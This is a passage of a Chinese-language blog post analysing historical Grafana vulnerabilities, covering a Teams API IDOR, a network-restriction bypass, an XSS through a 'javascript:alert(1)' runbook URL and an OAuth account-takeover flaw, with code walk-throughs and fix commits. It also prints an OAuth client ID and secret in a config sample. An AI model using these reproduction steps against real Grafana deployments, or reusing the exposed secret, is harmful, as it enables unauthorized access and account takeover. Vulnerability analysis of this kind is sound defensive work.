+<p><img src="/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230813104842663.png" alt="image-20230813104842663"></p>
+<p>pkg&#x2F;web&#x2F;binding.go:16，这里使用了go的标准库进行解析</p>
+<p><img src="/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230813105116764.png" alt="image-20230813105116764"></p>
+<h2 id="CVE-2022-21713（Teams-API-IDOR）"><a href="#CVE-2022-21713（Teams-API-IDOR）" class="headerlink" title="CVE-2022-21713（Teams API IDOR）"></a>CVE-2022-21713（Teams API IDOR）</h2><h3 id="影响范围-6"><a href="#影响范围-6" class="headerlink" title="影响范围"></a>影响范围</h3><p><strong>Affected versions</strong>: &gt;&#x3D; 5.0.0-beta1<br><strong>Patched versions</strong>: 8.3.5、7.5.15</p>
+<h3 id="漏洞复现-6"><a href="#漏洞复现-6" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>参考<a target="_blank" rel="noopener" href="https://github.com/grafana/grafana/security/advisories/GHSA-63g3-9jq3-mccv">CVE-2022-21713：Grafana Teams API IDOR</a>，在登录之后（Viewer或Editor权限都行），可通过以下接口获取本无权访问的数据</p>
+<ul>
+<li><code>/api/teams/search</code></li>
+<li><code>/api/teams/:teamId</code></li>
+<li><code>/api/teams/:teamId/members</code>（需要设置<code>editors_can_admin</code>为true）</li>
+</ul>
+<h3 id="漏洞分析-5"><a href="#漏洞分析-5" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>版本8.3.4，teams相关接口定义：</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">r.Group(<span class="string">&quot;/api&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(apiRoute routing.RouteRegister)</span></span> &#123;</span><br><span class="line">...</span><br><span class="line">  <span class="comment">// team (admin permission required)</span></span><br><span class="line">  apiRoute.Group(<span class="string">&quot;/teams&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(teamsRoute routing.RouteRegister)</span></span> &#123;</span><br><span class="line">    teamsRoute.Post(<span class="string">&quot;/&quot;</span>, bind(models.CreateTeamCommand&#123;&#125;), routing.Wrap(hs.CreateTeam))</span><br><span class="line">    teamsRoute.Put(<span class="string">&quot;/:teamId&quot;</span>, bind(models.UpdateTeamCommand&#123;&#125;), routing.Wrap(hs.UpdateTeam))</span><br><span class="line">    teamsRoute.Delete(<span class="string">&quot;/:teamId&quot;</span>, routing.Wrap(hs.DeleteTeamByID))</span><br><span class="line">    teamsRoute.Get(<span class="string">&quot;/:teamId/members&quot;</span>, routing.Wrap(hs.GetTeamMembers))</span><br><span class="line">    teamsRoute.Post(<span class="string">&quot;/:teamId/members&quot;</span>, bind(models.AddTeamMemberCommand&#123;&#125;), routing.Wrap(hs.AddTeamMember))</span><br><span class="line">    teamsRoute.Put(<span class="string">&quot;/:teamId/members/:userId&quot;</span>, bind(models.UpdateTeamMemberCommand&#123;&#125;), routing.Wrap(hs.UpdateTeamMember))</span><br><span class="line">    teamsRoute.Delete(<span class="string">&quot;/:teamId/members/:userId&quot;</span>, routing.Wrap(hs.RemoveTeamMember))</span><br><span class="line">    teamsRoute.Get(<span class="string">&quot;/:teamId/preferences&quot;</span>, routing.Wrap(hs.GetTeamPreferences))</span><br><span class="line">    teamsRoute.Put(<span class="string">&quot;/:teamId/preferences&quot;</span>, bind(dtos.UpdatePrefsCmd&#123;&#125;), routing.Wrap(hs.UpdateTeamPreferences))</span><br><span class="line">  &#125;, reqCanAccessTeams)</span><br><span class="line"></span><br><span class="line">  <span class="comment">// team without requirement of user to be org admin</span></span><br><span class="line">  apiRoute.Group(<span class="string">&quot;/teams&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(teamsRoute routing.RouteRegister)</span></span> &#123;</span><br><span class="line">    teamsRoute.Get(<span class="string">&quot;/:teamId&quot;</span>, routing.Wrap(hs.GetTeamByID))</span><br><span class="line">    teamsRoute.Get(<span class="string">&quot;/search&quot;</span>, routing.Wrap(hs.SearchTeams))</span><br><span class="line">  &#125;)</span><br><span class="line">...</span><br><span class="line">&#125;, reqSignedIn)</span><br></pre></td></tr></table></figure>
+
+<p>所有接口都要求reqSignedIn，即已登录。<code>/api/teams/:teamId/members</code> 接口还需要reqCanAccessTeams，代码在pkg&#x2F;middleware&#x2F;auth.go:136</p>
+<h4 id="api-teams-search"><a href="#api-teams-search" class="headerlink" title="&#x2F;api&#x2F;teams&#x2F;search"></a>&#x2F;api&#x2F;teams&#x2F;search</h4><p>pkg&#x2F;api&#x2F;team.go:88</p>
+<p><img src="/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230814143154837.png" alt="image-20230814143154837"></p>
+<p><code>EditorsCanAdmin</code>是需要在配置文件中设置的，默认是false，所以默认情况下，不管我们的角色是不是Admin，userIdFilter都是0，然后传入SearchTeamsQuery这个结构体，然后通过BUS机制调用具体的查询数据的逻辑：</p>
+<p><img src="/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230814143540414.png" alt="image-20230814143540414"></p>
+<p>具体代码在 pkg&#x2F;services&#x2F;sqlstore&#x2F;team.go:175</p>
+<p><img src="/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230814145312250.png" alt="image-20230814145312250"></p>
+<p>断点处的判断很关键，如果进入的是<code>query.UserIdFilter &gt; 0</code>这个分支，那么最终的SQL语句将会有user_id的相关查询和判断，最终拼接出的SQL语句如下：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span></span><br><span class="line">		team.id <span class="keyword">as</span> id,</span><br><span class="line">		team.org_id,</span><br><span class="line">		team.name <span class="keyword">as</span> name,</span><br><span class="line">		team.email <span class="keyword">as</span> email, (<span class="keyword">SELECT</span> <span class="built_in">COUNT</span>(<span class="operator">*</span>) <span class="keyword">FROM</span> team_member <span class="keyword">WHERE</span> team_member.team_id <span class="operator">=</span> team.id) <span class="keyword">AS</span> member_count  <span class="keyword">FROM</span> team <span class="keyword">as</span> team  <span class="keyword">WHERE</span> team.org_id <span class="operator">=</span> ? <span class="keyword">order</span> <span class="keyword">by</span> team.name <span class="keyword">asc</span> LIMIT <span class="number">1000</span> <span class="keyword">OFFSET</span> <span class="number">0</span></span><br></pre></td></tr></table></figure>
+
+<p>可以看到并未对用户权限或者所属team做判断，可以理解为0是一个特权id，有所有team的权限。</p>
+<p>如果进入另一个分支，那么SQL语句如下：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span></span><br><span class="line">		team.id <span class="keyword">AS</span> id,</span><br><span class="line">		team.org_id,</span><br><span class="line">		team.name <span class="keyword">AS</span> name,</span><br><span class="line">		team.email <span class="keyword">AS</span> email,</span><br><span class="line">		team_member.permission, (<span class="keyword">SELECT</span> <span class="built_in">COUNT</span>(<span class="operator">*</span>) <span class="keyword">FROM</span> team_member <span class="keyword">WHERE</span> team_member.team_id <span class="operator">=</span> team.id) <span class="keyword">AS</span> member_count  <span class="keyword">FROM</span> team <span class="keyword">AS</span> team</span><br><span class="line">		<span class="keyword">INNER</span> <span class="keyword">JOIN</span> team_member <span class="keyword">ON</span> team.id <span class="operator">=</span> team_member.team_id <span class="keyword">AND</span> team_member.user_id <span class="operator">=</span> ?  <span class="keyword">WHERE</span> team.org_id <span class="operator">=</span> ? <span class="keyword">order</span> <span class="keyword">by</span> team.name <span class="keyword">asc</span> LIMIT <span class="number">1000</span> <span class="keyword">OFFSET</span> <span class="number">0</span></span><br></pre></td></tr></table></figure>
+
+<p>这样如果用户不在这个team，将不会查询到数据</p>
+<h4 id="api-teams-teamId"><a href="#api-teams-teamId" class="headerlink" title="&#x2F;api&#x2F;teams&#x2F;:teamId"></a>&#x2F;api&#x2F;teams&#x2F;:teamId</h4><p>pkg&#x2F;api&#x2F;team.go:129</p>
+<p><img src="/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230814150134984.png" alt="image-20230814150134984"></p>
+<p>然后到pkg&#x2F;services&#x2F;sqlstore&#x2F;team.go:238</p>
+<p><img src="/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230814150301338.png" alt="image-20230814150301338"></p>
+<p>这个接口并未对用户做任何归属或者权限校验</p>
+<h4 id="api-teams-teamId-members"><a href="#api-teams-teamId-members" class="headerlink" title="&#x2F;api&#x2F;teams&#x2F;:teamId&#x2F;members"></a>&#x2F;api&#x2F;teams&#x2F;:teamId&#x2F;members</h4><p>先看reqCanAccessTeams，pkg&#x2F;middleware&#x2F;auth.go:136</p>
+<p><img src="/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230814151114476.png" alt="image-20230814151114476"></p>
+<p>只有当角色不是Admin并且enabled为False的时候才会accessForbidden，当前我们是Viewer，而这里的enabled其实是EditorsCanAdmin这项配置，见pkg&#x2F;api&#x2F;api.go:32</p>
+<p><img src="/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230814151412462.png" alt="image-20230814151412462"></p>
+<p>所以这里的权限验证就通过了，后面查询的具体逻辑在：pkg&#x2F;services&#x2F;sqlstore&#x2F;team.go:402</p>
+<h3 id="漏洞修复-6"><a href="#漏洞修复-6" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p><a target="_blank" rel="noopener" href="https://github.com/grafana/grafana/commit/254f19c70376286f0dc627b2d95c7f5cc63a8153">https://github.com/grafana/grafana/commit/254f19c70376286f0dc627b2d95c7f5cc63a8153</a></p>
+<h2 id="CVE-2022-29170（Network-restrictions-bypass）"><a href="#CVE-2022-29170（Network-restrictions-bypass）" class="headerlink" title="CVE-2022-29170（Network restrictions bypass）"></a>CVE-2022-29170（Network restrictions bypass）</h2><h3 id="影响范围-7"><a href="#影响范围-7" class="headerlink" title="影响范围"></a>影响范围</h3><p><strong>Affected versions</strong>: &gt;7.4<br><strong>Patched versions</strong>: 7.5.16、8.5.3</p>
+<h3 id="漏洞复现-7"><a href="#漏洞复现-7" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>该漏洞影响的是企业版，参考 <a target="_blank" rel="noopener" href="https://grafana.com/grafana/download?platform=docker">https://grafana.com/grafana/download?platform=docker</a> 运行指定版本</p>
+<p>复现比较简单，参照 <a target="_blank" rel="noopener" href="https://grafana.com/docs/grafana/latest/setup-grafana/configure-security/configure-request-security/#request-security">request-security</a> 配置黑白名单，然后添加一个Prometheus数据源，控制URL返回重定向，即可绕过安全策略</p>
+<h3 id="漏洞修复-7"><a href="#漏洞修复-7" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p><a target="_blank" rel="noopener" href="https://github.com/grafana/grafana/pull/49240/files">https://github.com/grafana/grafana/pull/49240/files</a></p>
+<p>其实还有其他方法可以绕过这个安全策略，已经提交官方了（CVE-2023-4399）</p>
+<h2 id="CVE-2022-31097（XSS-—-a标签href）"><a href="#CVE-2022-31097（XSS-—-a标签href）" class="headerlink" title="CVE-2022-31097（XSS — a标签href）"></a>CVE-2022-31097（XSS — a标签href）</h2><h3 id="影响范围-8"><a href="#影响范围-8" class="headerlink" title="影响范围"></a>影响范围</h3><p><strong>Affected versions</strong>: &lt; 9.0.3, &lt; 8.5.9, &lt; 8.4.10, &lt; 8.3.10, &gt;&#x3D;8.0<br><strong>Patched versions</strong>: 9.0.3, 8.5.9, 8.4.10, 8.3.10</p>
+<h3 id="漏洞复现-8"><a href="#漏洞复现-8" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>创建Alert rule，设置<code>Runbook URL</code>为<code>javascript:alert(1)</code>，对应显示界面会渲染为a标签的href属性，点击即可触发XSS</p>
+<h3 id="漏洞修复-8"><a href="#漏洞修复-8" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p><a target="_blank" rel="noopener" href="https://github.com/grafana/grafana/pull/52238/files#diff-691394a56baf1c8cb3534abb9530db44e1329d6f0bd8866049404848779bd13c">https://github.com/grafana/grafana/pull/52238/files#diff-691394a56baf1c8cb3534abb9530db44e1329d6f0bd8866049404848779bd13c</a></p>
+<p><img src="/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230818104252049.png" alt="image-20230818104252049"></p>
+<p>用@braintree&#x2F;sanitize-url 的 sanitizeUrl 处理</p>
+<h2 id="CVE-2022-31107（OAuth-账号接管）"><a href="#CVE-2022-31107（OAuth-账号接管）" class="headerlink" title="CVE-2022-31107（OAuth 账号接管）"></a>CVE-2022-31107（OAuth 账号接管）</h2><h3 id="影响范围-9"><a href="#影响范围-9" class="headerlink" title="影响范围"></a>影响范围</h3><p><strong>Affected versions</strong>: &lt; 9.0.3, &lt; 8.5.9, &lt; 8.4.10, &lt; 8.3.10, &gt;&#x3D; 5.3<br><strong>Patched versions</strong>: 9.0.3, 8.5.9, 8.4.10, 8.3.10</p>
+<h3 id="漏洞复现-9"><a href="#漏洞复现-9" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -p3000:3000 grafana/grafana:8.5.6</span><br></pre></td></tr></table></figure>
+
+<p>根据<a target="_blank" rel="noopener" href="https://github.com/grafana/grafana/security/advisories/GHSA-mx47-6497-3fv2">官方描述</a>，应该是所有类型的OAuth认证都存在账户接管问题，参考<a target="_blank" rel="noopener" href="https://grafana.com/docs/grafana/v8.5/auth/github/">官方文档</a>配置GitHub OAuth2。</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[auth.github]</span></span><br><span class="line"><span class="attr">enabled</span> = <span class="literal">true</span></span><br><span class="line"><span class="attr">allow_sign_up</span> = <span class="literal">true</span></span><br><span class="line"><span class="attr">client_id</span> = c89de4b541aeb0979995</span><br><span class="line"><span class="attr">client_secret</span> = <span class="number">8</span>bf5ec52ff1e92b382bac983232631205781bf2c</span><br><span class="line"><span class="attr">scopes</span> = user:email,read:org</span><br><span class="line"><span class="attr">auth_url</span> = https://github.com/login/oauth/authorize</span><br><span class="line"><span class="attr">token_url</span> = https://github.com/login/oauth/access_token</span><br><span class="line"><span class="attr">api_url</span> = https://api.github.com/user</span><br><span class="line"><span class="attr">allowed_domains</span> =</span><br><span class="line"><span class="attr">team_ids</span> =</span><br><span class="line">allowed_organizations =</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230819165912200.png" alt="image-20230819165912200"></p>
+<p>然后首先登录admin，创建一个和OAuth服务用户用户名相同，邮箱地址不同的账号，这里我创建和我github账号同名的用户<code>l3yx</code>，</p>
+<p>用OAuth登录，将会接管原本的<code>l3yx</code>账户</p>
+<p>当然正常的攻击方式是修改自己的OAuth对应服务的用户名，使其和Grafana中某个账户Username相同（或使用目标帐户的电子邮件作为用户名），以此接管指定账户</p>
+<h3 id="漏洞分析-6"><a href="#漏洞分析-6" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>可以先看一下OAuth的原理和实例：<a target="_blank" rel="noopener" href="https://www.ruanyifeng.com/blog/2019/04/github-oauth.html">GitHub OAuth 第三方登录示例教程</a>。Grafana 8.5.x 的版本前端代码一直编译不成功，所以调试用了8.4.7 的版本</p>
+<p>依然先创建用户和配置OAuth登录：</p>
+<p><img src="/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230820095531878.png" alt="image-20230820095531878"></p>
+<p>在pkg&#x2F;api&#x2F;login_oauth.go:72下断点，然后通过OAuth github登录</p>
+<p><img src="/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230820100810077.png" alt="image-20230820100810077"></p>
+<p>这里通过传入的参数”github”动态获取provider以及connect，然后计算一些参数，到pkg&#x2F;api&#x2F;login_oauth.go:142 生成跳转到github的链接</p>
+<p><img src="/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230820101238644.png" alt="image-20230820101238644"></p>
+<p><img src="/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230820101324704.png" alt="image-20230820101324704"></p>
+<p>用户在Github同意授权后，GitHub 就会重定向回Grafana，同时携带一个授权码：</p>
+<p><img src="/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230820101706481.png" alt="image-20230820101706481"></p>
+<p>断点再次到pkg&#x2F;api&#x2F;login_oauth.go:72，不过这次多了”code”和”state”参数，由于”code”参数，这次程序进入另一个if分支：</p>
+<p><img src="/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230820102114401.png" alt="image-20230820102114401"></p>
+<p>这里将URL中的state参数和ClientSecret进行运算后，与Cookie中的oauth_state进行比较，如果不同的话就会报错，而这里的Cookie中的oauth_state源自于第一次请求&#x2F;login&#x2F;github时，用随机串和ClientSecret运算生成的</p>
+<p>state校验通过后，会动态获取对应的oauthClient：</p>
+<p><img src="/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230820102817109.png" alt="image-20230820102817109"></p>
+<p>继续到pkg&#x2F;api&#x2F;login_oauth.go:191，这里使用授权码向GitHub请求Token</p>
+<p><img src="/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230820103226886.png" alt="image-20230820103226886"></p>
+<p>然后我第一次调试到这里，会有error，可能是调试时间太长导致授权码过期了，第二次调试直接断到Token获取这里</p>
+<p><img src="/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230820103720312.png" alt="image-20230820103720312"></p>
+<p>token获取成功后，用其初始化oauth2 client，然后获取了GitHub账户的信息：</p>
+<p><img src="/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230820103824138.png" alt="image-20230820103824138"></p>
+<p>到这里，OAuth认证的步骤就走完了，接下来便是Grafana将Github账户添加到自己系统中的逻辑，也是漏洞产生的关键地方。</p>
+<p>pkg&#x2F;api&#x2F;login_oauth.go:238 通过从GitHub获取的用户信息构建一个ExternalUser对象</p>
+<p><img src="/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230820105810832.png" alt="image-20230820105810832"></p>
+<p>然后进入syncUser，pkg&#x2F;api&#x2F;login_oauth.go:317</p>
+<p><img src="/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230820110418904.png" alt="image-20230820110418904"></p>
+<p>这里通过BUS机制调用用户的更新或者插入逻辑，具体方法在pkg&#x2F;services&#x2F;login&#x2F;loginservice&#x2F;loginservice.go:44</p>
+<p><img src="/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230820111125520.png" alt="image-20230820111125520"></p>
+<p>继续到pkg&#x2F;services&#x2F;login&#x2F;authinfoservice&#x2F;service.go:181</p>
+<p><img src="/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230820111715061.png" alt="image-20230820111715061"></p>
+<p>可以看到LookupByOneOf函数返回了系统中和我Github同名的用户，也就是说Grafana认为我的Github账号和系统中的那个账号是同一个用户，那么这样后续就是用我Github中的用户信息去更新系统中的原本账户，导致账户接管漏洞</p>
+<p>如果再进一步跟踪代码的话，其实就是用GitHub的用户名作为models.User的Login字段，然后用Xorm框架去查找，由于系统中原本的账户的Login字段就是Username，就导致查询出来了原本的账户</p>
+<p>pkg&#x2F;services&#x2F;login&#x2F;authinfoservice&#x2F;service.go:150</p>
+<p><img src="/2023/08/06/Grafana-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230820112437889.png" alt="image-20230820112437889"></p>
+<h3 id="漏洞修复-9"><a href="#漏洞修复-9" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p><a target="_blank" rel="noopener" href="https://github.com/grafana/grafana/pull/52238/commits/41a2c694414feabef022ef49c84bff5909a70740">https://github.com/grafana/grafana/pull/52238/commits/41a2c694414feabef022ef49c84bff5909a70740</a></p>
+<p>大概就是添加了一些字段，改变了用户的查找逻辑</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" rel="tag"># 漏洞分析</a>
+              <a href="/tags/Grafana/" rel="tag"># Grafana</a>
+              <a href="/tags/Go/" rel="tag"># Go</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2023/06/15/RocketMQ-5-1-1%E5%86%99%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1RCE/" rel="prev" title="RocketMQ 5.1.1写计划任务RCE">
+                  <i class="fa fa-angle-left"></i> RocketMQ 5.1.1写计划任务RCE
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2023/09/06/Docker%E7%BC%96%E8%AF%91OpenJDK-CodeQL%E6%95%B0%E6%8D%AE%E5%BA%93/" rel="next" title="Docker编译OpenJDK CodeQL数据库">
+                  Docker编译OpenJDK CodeQL数据库 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2024</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">淚笑</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
